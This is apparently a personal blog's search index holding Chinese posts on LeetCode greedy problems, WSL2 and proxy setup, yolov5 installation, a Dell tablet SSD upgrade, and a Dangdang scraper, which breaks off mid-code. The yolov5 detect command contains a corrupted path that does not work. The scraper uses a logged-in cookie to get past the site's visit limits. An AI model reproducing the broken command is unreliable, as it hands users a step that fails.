<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>LeetCode刷题笔记(一): 贪心</title>
    <url>/post/4d5c39be.html</url>
    <content><![CDATA[<p>贪心算法的核心思想：局部最优以实现全局最优。</p>
<h2 id="一、分配问题"><a href="#一、分配问题" class="headerlink" title="一、分配问题"></a>一、分配问题</h2><ul>
<li><p>题目：<br>n 个孩子站成一排。给你一个整数数组 ratings 表示每个孩子的评分。<br>你需要按照以下要求，给这些孩子分发糖果：<br>①每个孩子至少分配到 1 个糖果。<br>②相邻两个孩子中，评分更高的那个会获得更多的糖果。<br>请你给每个孩子分发糖果，计算并返回需要准备的最少糖果数目。</p>
<p>解答：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">candy</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;ratings)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = ratings.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">candies</span><span class="params">(n, <span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (ratings[i] &gt; ratings[i - <span class="number">1</span>]) &#123;</span><br><span class="line">                candies[i] = candies[i - <span class="number">1</span>] + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = n - <span class="number">1</span>; i &gt; <span class="number">0</span>; --i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (ratings[i] &lt; ratings[i - <span class="number">1</span>]) &#123;</span><br><span class="line">                candies[i - <span class="number">1</span>] = <span class="built_in">max</span>(candies[i - <span class="number">1</span>], candies[i] + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">accumulate</span>(candies.<span class="built_in">begin</span>(), candies.<span class="built_in">end</span>(), <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;;</span><br></pre></td></tr></table></figure>
<p>提示：两次遍历，每次只用关注相邻的一边即可。</p>
</li>
</ul>
<h2 id="二、区间问题"><a href="#二、区间问题" class="headerlink" title="二、区间问题"></a>二、区间问题</h2><ul>
<li><p>题目：<br>给定一个区间的集合 intervals ，其中 intervals[i] &#x3D; [starti, endi] 。返回需要移除区间的最小数量，使剩余区间互不重叠。<br>注意：只在一点上接触的区间是不重叠的。例如 [1, 2] 和 [2, 3] 是不重叠的。</p>
<p>解答：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">eraseOverlapIntervals</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; intervals)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">sort</span>(intervals.<span class="built_in">begin</span>(), intervals.<span class="built_in">end</span>(), [](vector&lt;<span class="type">int</span>&gt; &amp;a, vector&lt;<span class="type">int</span>&gt; &amp;b)</span><br><span class="line">             &#123; <span class="keyword">return</span> a[<span class="number">1</span>] &lt; b[<span class="number">1</span>]; &#125;);</span><br><span class="line">        <span class="type">int</span> prev = intervals[<span class="number">0</span>][<span class="number">1</span>];</span><br><span class="line">        <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (vector&lt;<span class="type">int</span>&gt; interval : intervals) &#123;</span><br><span class="line">            <span class="keyword">if</span> (interval[<span class="number">0</span>] &lt; prev)</span><br><span class="line">                count++;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                prev = interval[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>提示：要做到尽量互不重叠即需要保留end越小越好。</p>
</li>
</ul>
<h2 id="三、练习"><a href="#三、练习" class="headerlink" title="三、练习"></a>三、练习</h2><ul>
<li><p>题目一：<br>给你一个整数数组 prices ，其中 prices[i] 表示某支股票第 i 天的价格。<br>在每一天，你可以决定是否购买和&#x2F;或出售股票。你在任何时候最多只能持有一股股票。你也可以先购买，然后在同一天出售。<br>返回你能获得的最大利润 。</p>
<p>解答：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxProfit</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; prices)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> prev = prices[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; prices.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (prices[i] &lt; prev) &#123;</span><br><span class="line">                prev = prices[i];</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            sum += (prices[i] - prev);</span><br><span class="line">            prev = prices[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>提示：动态规划 is always right。</p>
</li>
<li><p>题目二：<br>给你一个字符串 s 。我们要把这个字符串划分为尽可能多的片段，同一字母最多出现在一个片段中。例如，字符串 “ababcc” 能够被分为 [“abab”, “cc”]，但类似 [“aba”, “bcc”] 或 [“ab”, “ab”, “cc”] 的划分是非法的。<br>注意，划分结果需要满足：将所有划分结果按顺序连接，得到的字符串仍然是 s 。<br>返回一个表示每个字符串片段的长度的列表。</p>
<p>解答：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">partitionLabels</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">hash1</span><span class="params">(<span class="number">26</span>, <span class="number">-1</span>)</span></span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">hash2</span><span class="params">(<span class="number">26</span>, <span class="number">-1</span>)</span></span>;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; intervals;</span><br><span class="line">        intervals.<span class="built_in">reserve</span>(<span class="number">52</span>);</span><br><span class="line">        <span class="type">int</span> length = s.<span class="built_in">length</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = length - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (hash1[s[i] - <span class="string">&#x27;a&#x27;</span>] == <span class="number">-1</span>)</span><br><span class="line">                hash1[s[i] - <span class="string">&#x27;a&#x27;</span>] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; length; i ++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (hash2[s[i] - <span class="string">&#x27;a&#x27;</span>] == <span class="number">-1</span>) &#123;</span><br><span class="line">                hash2[s[i] - <span class="string">&#x27;a&#x27;</span>] = i;</span><br><span class="line">                vector&lt;<span class="type">int</span>&gt; interval = &#123;hash2[s[i] - <span class="string">&#x27;a&#x27;</span>], hash1[s[i] - <span class="string">&#x27;a&#x27;</span>]&#125;;</span><br><span class="line">                intervals.<span class="built_in">push_back</span>(interval);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">        res.<span class="built_in">reserve</span>(length);</span><br><span class="line">        <span class="type">int</span> start = intervals[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">        <span class="type">int</span> prev = intervals[<span class="number">0</span>][<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; intervals.<span class="built_in">size</span>(); i ++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (intervals[i][<span class="number">0</span>] &lt; prev) </span><br><span class="line">                prev = prev &gt; intervals[i][<span class="number">1</span>] ? prev : intervals[i][<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                res.<span class="built_in">push_back</span>(prev - start + <span class="number">1</span>);</span><br><span class="line">                start = intervals[i][<span class="number">0</span>];</span><br><span class="line">                prev = intervals[i][<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="built_in">push_back</span>(prev - start + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>提示：记录开始和结束位置转化为区间问题。</p>
</li>
</ul>
]]></content>
      <tags>
        <tag>算法</tag>
        <tag>LeetCode</tag>
        <tag>贪心</tag>
      </tags>
  </entry>
  <entry>
    <title>WSL2的安装和简单配置</title>
    <url>/post/87099e43.html</url>
    <content><![CDATA[<p>写在前面：本教程使用的是Windows11的系统，不保证Windows10也适用。</p>
<h2 id="一、为Windows启用Hyper-v虚拟化"><a href="#一、为Windows启用Hyper-v虚拟化" class="headerlink" title="一、为Windows启用Hyper-v虚拟化"></a>一、为Windows启用Hyper-v虚拟化</h2><ul>
<li><p>按下win键，打开开始菜单，在搜索框中搜索<code>powershell</code>并按下右键选择以管理员身份运行。<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post2/0865930a85e7def3f66138ae61450941.png" alt="展示"></p>
</li>
<li><p>输入命令来执行虚拟化操作：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Enable-WindowsOptionalFeature -Online -FeatureName $(<span class="string">&quot;Microsoft-Windows-Subsystem-Linux&quot;</span>,<span class="string">&quot;VirtualMachinePlatform&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>  此操作需要重启，若询问是否立即重启执行操作，输入Y并按下回车键即可。</p>
</li>
</ul>
<h2 id="二、设置WSL2默认版本为version2"><a href="#二、设置WSL2默认版本为version2" class="headerlink" title="二、设置WSL2默认版本为version2"></a>二、设置WSL2默认版本为version2</h2><p>在之前的管理员powershell界面输入<code>wsl --set-default-version 2</code>即可，之后可以输入<code>wsl -v</code>来确定版本。<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post2/168383ad282389c72db900a0869ef219.png" alt="wsl版本"><br>现在win11默认的wsl版本就是2，此操作也可以不做。</p>
<h2 id="三、下载Linux发行版"><a href="#三、下载Linux发行版" class="headerlink" title="三、下载Linux发行版"></a>三、下载Linux发行版</h2><h3 id="方案一：通过Microsoft-Store来进行下载"><a href="#方案一：通过Microsoft-Store来进行下载" class="headerlink" title="方案一：通过Microsoft Store来进行下载"></a>方案一：通过Microsoft Store来进行下载</h3><p>通过微软商店来下载非常简单，只需要在微软商店搜索对应的Linux发行版的名字即可进行下载。比如这里以下载ubuntu为例：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post2/d573d3eb16225db1e4a8dcf3c017d7b4.png" alt="Ubuntu"></p>
<h3 id="方案二：通过命令行来进行安装-推荐"><a href="#方案二：通过命令行来进行安装-推荐" class="headerlink" title="方案二：通过命令行来进行安装(推荐)"></a>方案二：通过命令行来进行安装(推荐)</h3><ul>
<li>使用<code>wsl -l -o</code>命令来查看当前可用的发行版。<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post2/6b3a505f144d94c59fe6fb4d9589e697.png" alt="可用列表"></li>
<li>使用<code>wsl --install -d &lt;distribution name&gt;</code>命令来下载指定的Linux发行版，这里的distribution name就是指上面那个操作中的第一列列出来的名称。</li>
</ul>
<p>等待耐心下载完并弹出相应提示之后，安装过程就完成了。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 输出类似如下信息则启动成功</span></span><br><span class="line">Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.153.1-microsoft-standard-WSL2 x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br></pre></td></tr></table></figure>

<h2 id="四、-wslconfig文件设置"><a href="#四、-wslconfig文件设置" class="headerlink" title="四、.wslconfig文件设置"></a>四、.wslconfig文件设置</h2><ul>
<li><p>进入<code>C:/Users/Username/</code>目录，如果当前目录不存在名为<code>.wslconfig</code>的文件，则手动创建一个。</p>
</li>
<li><p>用记事本打开<code>.wslconfig</code>文件并输入以下内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[experimental]</span><br><span class="line">autoMemoryReclaim=gradual  </span><br><span class="line">networkingMode=mirrored</span><br><span class="line">dnsTunneling=<span class="literal">true</span></span><br><span class="line">firewall=<span class="literal">true</span></span><br><span class="line">autoProxy=<span class="literal">true</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>这个操作之后可以使用<code>ip addr</code>命令查看ip地址并和在<code>powershell</code>中输入<code>ipconfig</code>后的地址进行对比，如若一样则网络模式修改成功。此外，上面的功能是Windows内部版本19041及更高版本中作为wsl2运行的发行版特有的，可以自行去看官网以了解更多功能<a href="https://learn.microsoft.com/en-us/windows/wsl/wsl-config#configuration-options">WSL配置</a>。</p>
<h3 id="clash接管wsl2网络"><a href="#clash接管wsl2网络" class="headerlink" title="clash接管wsl2网络"></a>clash接管wsl2网络</h3><p>让clash接管wsl的网络，需要先在clash中打开<code>Allow LAN</code>功能。<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post2/clash1.png" alt="clash"></p>
<h4 id="方案一-你能使用wsl2的实验性功能"><a href="#方案一-你能使用wsl2的实验性功能" class="headerlink" title="方案一(你能使用wsl2的实验性功能)"></a>方案一(你能使用wsl2的实验性功能)</h4><p>确保上述的操作无误，输入<code>wget www.google.com</code>来确认clash确实已经接管了wsl的网络(此操作需要在Linux的不需要root写权限的目录下进行)。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; wget www.google.com</span><br><span class="line"></span><br><span class="line">--2025-01-21 22:18:49--  http://www.google.com/</span><br><span class="line">Connecting to 127.0.0.1:7890... connected.</span><br><span class="line">Proxy request sent, awaiting response... 200 OK</span><br><span class="line">Length: unspecified [text/html]</span><br><span class="line">Saving to: ‘index.html’</span><br><span class="line"></span><br><span class="line">index.html                        [ &lt;=&gt;                                              ]  19.35K  --.-KB/s    <span class="keyword">in</span> 0.05s</span><br><span class="line"></span><br><span class="line">2025-01-21 22:18:49 (376 KB/s) - ‘index.html’ saved [19818]</span><br></pre></td></tr></table></figure>

<h4 id="方案二-你不能使用wsl2的实验性功能"><a href="#方案二-你不能使用wsl2的实验性功能" class="headerlink" title="方案二(你不能使用wsl2的实验性功能)"></a>方案二(你不能使用wsl2的实验性功能)</h4><p>这里借鉴了某<a href="https://eastmonster.github.io/2022/10/05/clash-config-in-wsl/">大神</a>的方案，若你的wsl版本或者windows版本不能使用上面的配置，将<code>.wslconfig</code>中的内容改为</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[wsl2]</span><br><span class="line">dnsTunneling=<span class="literal">false</span></span><br></pre></td></tr></table></figure>

<p>之后编辑Linux根目录下的<code>.bashrc</code>文件，加入以下三行内容</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">host_ip=$(<span class="built_in">cat</span> /etc/resolv.conf |grep <span class="string">&quot;nameserver&quot;</span> |<span class="built_in">cut</span> -f 2 -d <span class="string">&quot; &quot;</span>)</span><br><span class="line"><span class="built_in">export</span> http_proxy=<span class="string">&quot;http://<span class="variable">$host_ip</span>:[端口]&quot;</span></span><br><span class="line"><span class="built_in">export</span> https_proxy=<span class="string">&quot;http://<span class="variable">$host_ip</span>:[端口]&quot;</span></span><br></pre></td></tr></table></figure>

<p>这里的端口就是clash的port，如上面我的截图中clash的端口是7890(一般默认就是7890)。完成后输入<code>source ~/.bashrc</code>来让配置生效，可以输入<code>echo $http_proxy</code>来验证是否成功。</p>
<h2 id="五、更换软件源"><a href="#五、更换软件源" class="headerlink" title="五、更换软件源"></a>五、更换软件源</h2><p>根据你使用的Linux发行版直接上网搜索相应的镜像源即可，这里给出一个汇总链接<a href="https://segmentfault.com/a/1190000000375848">镜像源</a>。复制相应的镜像源后，直接进行修改即可。这里以debian12更换清华源为例。</p>
<ul>
<li><p>访问<a href="https://mirrors.tuna.tsinghua.edu.cn/help/debian/">debian清华镜像源</a>(网址中的debian可换成你的Linux发行版)并复制软件源。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释</span></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm main contrib non-free non-free-firmware</span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm main contrib non-free non-free-firmware</span></span><br><span class="line"></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm-updates main contrib non-free non-free-firmware</span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm-updates main contrib non-free non-free-firmware</span></span><br><span class="line"></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm-backports main contrib non-free non-free-firmware</span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm-backports main contrib non-free non-free-firmware</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 以下安全更新软件源包含了官方源与镜像站配置，如有需要可自行修改注释切换</span></span><br><span class="line">deb https://security.debian.org/debian-security bookworm-security main contrib non-free non-free-firmware</span><br><span class="line"><span class="comment"># deb-src https://security.debian.org/debian-security bookworm-security main contrib non-free non-free-firmware</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>备份文件并修改文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 备份源文件</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">mv</span> /etc/apt/sources.list /etc/apt/sources.list.backup</span><br><span class="line"><span class="comment"># 修改文件</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">touch</span> /etc/apt/sources.list</span><br><span class="line"><span class="built_in">sudo</span> vi /etc/apt/sources.list <span class="comment"># 将复制内容粘贴进去 </span></span><br></pre></td></tr></table></figure>

<p>相信vim操作就不用教了吧，这里也可以使用你更熟悉的编辑器进行修改。</p>
</li>
</ul>
<p>最后输入<code>sudo apt update</code>和<code>sudo apt upgrade</code>命令即可验证软件源是否修改成功。</p>
]]></content>
      <tags>
        <tag>WSL2</tag>
        <tag>Windows11</tag>
        <tag>Linux</tag>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>yolov5环境配置教程</title>
    <url>/post/9807c50b.html</url>
    <content><![CDATA[<p>写在前面：本学期因为大创需要使用yolov模型来进行相关的工作，故记录如下。使用的系统为Ubuntu18.04.</p>
<h2 id="1-安装Anaconda"><a href="#1-安装Anaconda" class="headerlink" title="1.安装Anaconda"></a>1.安装Anaconda</h2><ul>
<li><p>访问<a href="https://repo.anaconda.com/archive/Anaconda3-2024.10-1-Linux-x86_64.sh">Anaconda官网下载合适版本</a>。</p>
</li>
<li><p>导航到下载目录：使用cd命令导航到下载目录。例如，如果下载文件在Downloads目录下：</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/Downloads</span><br></pre></td></tr></table></figure>
</li>
<li><p>运行安装脚本：使用bash命令运行下载的安装脚本：</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash Anaconda3-2024.10-1-Linux-x86_64.sh</span><br></pre></td></tr></table></figure>
</li>
<li><p>阅读并接受许可协议：在安装过程中，会显示许可协议，按q键跳过，然后输入yes接受协议。</p>
</li>
<li><p>选择安装路径：默认安装路径是&#x2F;home&#x2F;your_username&#x2F;anaconda3，可以按Enter接受默认路径，或者输入其他路径。</p>
</li>
<li><p>初始化Anaconda：安装完成后，系统会提示是否初始化Anaconda，输入yes以启用。</p>
</li>
<li><p>更新环境变量：安装完成后，关闭并重新打开终端，或者运行以下命令使环境变量生效：</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure>
</li>
<li><p>验证安装：在终端中输入以下命令，检查Anaconda是否安装成功：</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">conda --version</span><br></pre></td></tr></table></figure>

<p>  如果安装成功，会显示Anaconda的版本号。</p>
</li>
<li><p>创建虚拟环境：打开终端，输入以下命令创建一个名为yolov5的虚拟环境，并指定Python版本为3.12(官方的文档里说明的是python版本大于等于3.8.0)：</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">conda create -n yolov5 python=3.12</span><br><span class="line">conda activate yolov5</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="2-安装pytorch"><a href="#2-安装pytorch" class="headerlink" title="2.安装pytorch"></a>2.安装pytorch</h2><ul>
<li><p>安装PyTorch(官方的文档里说明的是pytorch版本大于等于1.8)：如果你可以直连n卡(比如真机，双系统和使用了kvm虚拟化的wsl)，下载GPU版本的pytorch：</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">conda install pytorch torchvision torchaudio pytorch-cuda=11.7 -c pytorch -c nvidia</span><br></pre></td></tr></table></figure>

<p>  否则使用CPU版本的pytorch：</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">conda install pytorch torchvision torchaudio cpuonly -c pytorch</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="3-安装相关依赖"><a href="#3-安装相关依赖" class="headerlink" title="3.安装相关依赖"></a>3.安装相关依赖</h2><ul>
<li><p>安装依赖：在YOLOv5项目根目录下，运行以下命令安装所有必需的Python包：</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="4-验证安装"><a href="#4-验证安装" class="headerlink" title="4.验证安装"></a>4.验证安装</h2><ul>
<li><p>下载预训练模型：从YOLOv5的GitHub发布页面下载预训练模型，并将其放置在YOLOv5项目目录下。</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://github.com/ultralytics/yolov5/releases/download/v6.2/yolov5s.pt</span><br></pre></td></tr></table></figure>
</li>
<li><p>验证安装：运行一个简单的推理脚本来验证YOLOv5是否正确安装：</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python detect.py --<span class="built_in">source</span> ./datahttps://my-github-blog.oss-cn-hangzhou.aliyuncs.coms/ --weights ./yolov5s.pt</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="5-相关的官方链接"><a href="#5-相关的官方链接" class="headerlink" title="5.相关的官方链接"></a>5.相关的官方链接</h2><ul>
<li>源仓库的github链接：<a href="https://github.com/ultralytics/yolov5">yolov5源仓库</a></li>
<li>官方教程文档：<a href="https://docs.ultralytics.com/zh/yolov5/">yolov5教程</a></li>
</ul>
]]></content>
      <tags>
        <tag>Linux</tag>
        <tag>教程</tag>
        <tag>yolov</tag>
      </tags>
  </entry>
  <entry>
    <title>DELL Latitude 5290 2in1扩展硬盘避坑</title>
    <url>/post/4a17b156.html</url>
    <content><![CDATA[<p>PS：写这篇文章的原因是我在扩展这个平板的硬盘时就踩过坑，而且关于这台平板的文章在网上非常少且有些错误的地方。</p>
<p>自从需要带着电脑出去干活的频率升高后就一直想搞个win平板玩玩，主要是方便带着出门加轻度办公<del>（其实主要原因是方便玩旮旯给木）</del>。为什么要选择傻多戴呢，无他，就是因为可以扩展硬盘而且二手也不贵（某鱼上1000多一点带键盘拿下，基本上是全新）。</p>
<h2 id="关于硬盘位"><a href="#关于硬盘位" class="headerlink" title="关于硬盘位"></a>关于硬盘位</h2><p>关于大家最关心的扩展位硬盘的问题，这个硬盘位是wwan口，<strong>不支持sata协议，只支持nvme协议 pcie3.0，并且需要双缺口（B&amp;M key）的硬盘才能插得进去</strong>。规格我选择的是2242的（是短硬盘，平时大家看得多的长硬盘是2280规格的），2230的没试过，貌似也是可以的（别人有成功过）。根据硬盘的螺丝定位口来看，2242是刚刚好的。<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post1/ae270d110612862760e6b359d714f10a429931853.jpg" alt="硬盘展示"></p>
<h2 id="速度"><a href="#速度" class="headerlink" title="速度"></a>速度</h2><p>测速大家自己看吧<del>（主硬盘位商家给了一根sata协议的好黑心）</del><br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post1/e29d3ea9d3e14ea0f3912cba53f352ac429931853.png" alt="测速展示"></p>
<p>在这里纠正一点，在别的文章有看到过把ngff和nvme放在一起说的，而实际上ngff和nvme不是并列关系，ngff（Next Generation Form Factor）就是m.2的前称，而nvme是一种传输协议。</p>
]]></content>
      <tags>
        <tag>DELL</tag>
        <tag>搞机</tag>
        <tag>win平板</tag>
        <tag>避坑</tag>
      </tags>
  </entry>
  <entry>
    <title>当当网数据爬取脚本</title>
    <url>/post/7d2474f8.html</url>
    <content><![CDATA[<p>写在前面：因为这学期上了软院传奇屎课软工2，为了更好地展示大作业(图书商城)的效果，故写了个爬虫爬取了当当网的数据。</p>
<h2 id="一、获取Cookie"><a href="#一、获取Cookie" class="headerlink" title="一、获取Cookie"></a>一、获取Cookie</h2><p>因为不登陆的话当当网是有访问次数限制的，所以需要获取个人Cookie来维持登录状态。Cookie的获取非常简单，只需要在浏览器登录当当网后按下f12打开开发者工具，选择网络后再刷新一下页面，选择其中某一个元素就能查看到Cookie。</p>
<p><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post7/e9f5d94557761a286babeecadcfdbbb4.png" alt="获取cookie"></p>
<p>相关的登陆代码大致如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="variable language_">self</span>.session = requests.Session()</span><br><span class="line">    <span class="variable language_">self</span>.headers = &#123; <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36&#x27;</span>&#125;</span><br><span class="line">    <span class="variable language_">self</span>.session.headers.update(<span class="variable language_">self</span>.headers)   </span><br><span class="line">    <span class="comment"># 直接从cookie.txt加载Cookie</span></span><br><span class="line">    <span class="variable language_">self</span>.load_cookies_from_file()</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_cookies_from_file</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;从cookie.txt文件加载Cookie数据&quot;&quot;&quot;</span></span><br><span class="line">    cookie_file = <span class="string">&quot;cookie.txt&quot;</span></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(cookie_file):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(cookie_file, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                cookie_str = f.read().strip()</span><br><span class="line">                <span class="keyword">if</span> cookie_str:</span><br><span class="line">                    <span class="comment"># 解析Cookie字符串并添加到会话中</span></span><br><span class="line">                    cookies = &#123;&#125;</span><br><span class="line">                    <span class="keyword">for</span> item <span class="keyword">in</span> cookie_str.split(<span class="string">&#x27;;&#x27;</span>):</span><br><span class="line">                        <span class="keyword">if</span> item:</span><br><span class="line">                            item = item.strip()</span><br><span class="line">                            <span class="keyword">if</span> <span class="string">&#x27;=&#x27;</span> <span class="keyword">in</span> item:</span><br><span class="line">                                key, value = item.split(<span class="string">&#x27;=&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">                                cookies[key] = value</span><br><span class="line">                        </span><br><span class="line">                    <span class="comment"># 将Cookie添加到会话</span></span><br><span class="line">                    <span class="variable language_">self</span>.session.cookies.update(cookies)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;已从cookie.txt加载Cookie数据&quot;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;cookie.txt文件为空&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;加载Cookie数据失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;未找到cookie.txt文件，将使用无登录状态访问&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span 